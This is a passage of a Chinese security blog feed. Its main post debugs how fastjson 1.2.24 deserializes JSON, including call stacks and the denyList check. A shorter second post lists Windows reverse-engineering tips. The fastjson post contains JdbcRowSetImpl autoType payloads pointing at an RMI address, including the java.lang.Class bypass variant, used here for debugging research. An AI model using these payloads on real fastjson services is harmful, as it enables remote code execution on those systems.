&lt;p&gt;经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}&lt;/li&gt;
  &lt;li&gt;{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true}&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以导致数组越界&lt;/p&gt;

&lt;p&gt;再调试另一种payload&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在&lt;/p&gt;

&lt;p&gt;deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)&lt;/p&gt;

&lt;p&gt;下面是调用堆栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser)
setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:105, StringCodec (com.alibaba.fastjson.serializer)
deserialze:87, StringCodec (com.alibaba.fastjson.serializer)
parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:243, JSON (com.alibaba.fastjson)
parseObject:456, JSON (com.alibaba.fastjson)
main:41, test (test)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错&lt;/p&gt;

&lt;p&gt;感觉像是代码的bug&lt;/p&gt;

&lt;p&gt;验证：&lt;/p&gt;

&lt;p&gt;通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败&lt;/p&gt;

&lt;p&gt;1.2.47：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233523275.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1.2.24：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233548941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="java" /><summary type="html">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧 分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松 调试用的代码 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; Group group = JSON.parseObject(jsonString, Group.class); 从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner JSONScanner JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部 JSONLexerBase有几个成员变量 protected int token; protected int pos; protected int features; protected char ch; protected int bp;//当前指向的位置 protected int eofPos; /** * A character buffer for literals. */ protected char[] sbuf; protected int sp; /** * number start position */ protected int np; 同时JSONScanner也新定义了两个 private final String text; //反序列化的字符串 private final int len;//字符串长度 //将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符 public final char next() { int index = ++bp; return ch = (index &amp;gt;= this.len ? // EOI // : text.charAt(index)); } JSONScanner的初始化 public JSONScanner(String input, int features){ super(features); text = input; len = text.length(); bp = -1; next(); if (ch == 65279) { // utf-8 bom next(); } } DefaultJSONParser 不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化 在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建 进入这个函数 public ObjectDeserializer getDeserializer(Type type) { //首先会在已有的deserializer中找，this.derializers是一个hashmap ObjectDeserializer derializer = this.derializers.get(type); if (derializer != null) { return derializer; } //没有找着就接着找 if (type instanceof Class&amp;lt;?&amp;gt;) { return getDeserializer((Class&amp;lt;?&amp;gt;) type, type); } ………………省略…………………… } 进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中 public ObjectDeserializer getDeserializer(Class&amp;lt;?&amp;gt; clazz, Type type) { //继续匹配 ObjectDeserializer derializer = derializers.get(type); if (derializer != null) { return derializer; } if (type == null) { type = clazz; } //继续匹配 derializer = derializers.get(type); if (derializer != null) { return derializer; } { JSONType annotation = clazz.getAnnotation(JSONType.class); if (annotation != null) { Class&amp;lt;?&amp;gt; mappingTo = annotation.mappingTo(); if (mappingTo != Void.class) { return getDeserializer(mappingTo, mappingTo); } } } //判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道 if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) { derializer = derializers.get(clazz); } if (derializer != null) { return derializer; } //反序列化的类是否在denyList中 String className = clazz.getName(); className = className.replace('$', '.'); for (int i = 0; i &amp;lt; denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(&quot;parser deny : &quot; + className); } } 之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer 如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false 先跟进asm为false的情况，直接new一个JavaBeanDeserializer JavaBeanDeserializer //其中定义的一些成员变量 private final FieldDeserializer[] fieldDeserializers; protected final FieldDeserializer[] sortedFieldDeserializers; protected final Class&amp;lt;?&amp;gt; clazz; public final JavaBeanInfo beanInfo; private ConcurrentMap&amp;lt;String, Object&amp;gt; extraFieldDeserializers; com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法 最后返回一个JavaBeanInfo类 在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields public JavaBeanInfo(Class&amp;lt;?&amp;gt; clazz, // Class&amp;lt;?&amp;gt; builderClass, // Constructor&amp;lt;?&amp;gt; defaultConstructor, // Constructor&amp;lt;?&amp;gt; creatorConstructor, // Method factoryMethod, // Method buildMethod, // JSONType jsonType, // List&amp;lt;FieldInfo&amp;gt; fieldList){ this.clazz = clazz; this.builderClass = builderClass; this.defaultConstructor = defaultConstructor; this.creatorConstructor = creatorConstructor; this.factoryMethod = factoryMethod; this.parserFeatures = TypeUtils.getParserFeatures(clazz); this.buildMethod = buildMethod; ....省略..... fields = new FieldInfo[fieldList.size()]; fieldList.toArray(fields); FieldInfo[] sortedFields = new FieldInfo[fields.length]; System.arraycopy(fields, 0, sortedFields, 0, fields.length); Arrays.sort(sortedFields); ....省略..... } 在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中 至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化 fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349 从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值 当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理 之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object) 判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析 当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader) 之后会根据clazz获取deserializer进行反序列化 用asm来生成处理类的情况： 也就是当asmEnable为true的情况 截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了 为什么要有autoType功能 在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问 https://github.com/alibaba/fastjson/issues/3218 当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息 遇到的问题 测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功 使用payload1 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1 调用栈 popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser) parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 看了一下，是因为执行这条语句是contextArrayIndex为0导致的 经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是 {&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;} {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true} 所以导致数组越界 再调试另一种payload String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在 deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) 下面是调用堆栈 addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser) setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:105, StringCodec (com.alibaba.fastjson.serializer) deserialze:87, StringCodec (com.alibaba.fastjson.serializer) parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错 感觉像是代码的bug 验证： 通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败 1.2.47： 1.2.24：</summary></entry><entry><title type="html">逆向的一些总结</title><link href="https://citrusice.github.io/posts/re-summarize/" rel="alternate" type="text/html" title="逆向的一些总结" /><published>2020-07-09T18:35:43+08:00</published><updated>2020-07-09T18:35:43+08:00</updated><id>https://citrusice.github.io/posts/re-summarize</id><content type="html" xml:base="https://citrusice.github.io/posts/re-summarize/">&lt;p&gt;最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;观察程序行为&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;文件操作&lt;/li&gt;
      &lt;li&gt;注册表读写&lt;/li&gt;
      &lt;li&gt;dll调用&lt;/li&gt;
      &lt;li&gt;……&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;procmon&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;定位关键代码&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;搜索字符串特征&lt;/li&gt;
      &lt;li&gt;相关windows api
        &lt;ul&gt;
          &lt;li&gt;CreateFile&lt;/li&gt;
          &lt;li&gt;ReadFile&lt;/li&gt;
          &lt;li&gt;WriteFile&lt;/li&gt;
          &lt;li&gt;……&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;内存断点&lt;/li&gt;
      &lt;li&gt;函数特征，ida signature，findcrypt&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;代码分析&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;动态分析 =&amp;gt; 分析具体行为&lt;/li&gt;
      &lt;li&gt;静态分析 =&amp;gt; 分析调用关系，程序逻辑&lt;/li&gt;
      &lt;li&gt;关注数据流向&lt;/li&gt;
      &lt;li&gt;类的识别&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;逆不动？&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;注入进程寻找解密后的数据&lt;/li&gt;
      &lt;li&gt;找到解密函数直接调用&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;未解决的问题以及可能的解决方案&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;结构体及类的逆向&lt;/p&gt;

        &lt;p&gt;下次可以尝试使用reclass&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码&lt;/p&gt;

        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;ce搜索指针链，一层一层定位初始化代码&lt;/p&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;下断new，malloc、VirtualAlloc等函数，定位构造函数&lt;/p&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;根据构造函数特征定位构造函数&lt;/p&gt;

            &lt;ul&gt;
              &lt;li&gt;
                &lt;p&gt;使用ecx传参（类函数特征）&lt;/p&gt;
              &lt;/li&gt;
              &lt;li&gt;
                &lt;p&gt;函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx&lt;/p&gt;

                &lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-195449.htm&quot;&gt;https://bbs.pediy.com/thread-195449.htm&lt;/a&gt;&lt;/p&gt;

                &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/predator-wang/p/8031071.html&quot;&gt;https://www.cnblogs.com/predator-wang/p/8031071.html&lt;/a&gt;&lt;/p&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ps：&lt;/p&gt;

&lt;p&gt;web手做逆向，有点惨&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下 观察程序行为 文件操作 注册表读写 dll调用 …… procmon 定位关键代码 搜索字符串特征 相关windows api CreateFile ReadFile WriteFile …… 内存断点 函数特征，ida signature，findcrypt 代码分析 动态分析 =&amp;gt; 分析具体行为 静态分析 =&amp;gt; 分析调用关系，程序逻辑 关注数据流向 类的识别 逆不动？ 注入进程寻找解密后的数据 找到解密函数直接调用 未解决的问题以及可能的解决方案 结构体及类的逆向 下次可以尝试使用reclass 在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码 ce搜索指针链，一层一层定位初始化代码 下断new，malloc、VirtualAlloc等函数，定位构造函数 根据构造函数特征定位构造函数 使用ecx传参（类函数特征） 函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx https://bbs.pediy.com/thread-195449.htm https://www.cnblogs.com/predator-wang/p/8031071.html ps： web手做逆向，有点惨</summary></entry></feed>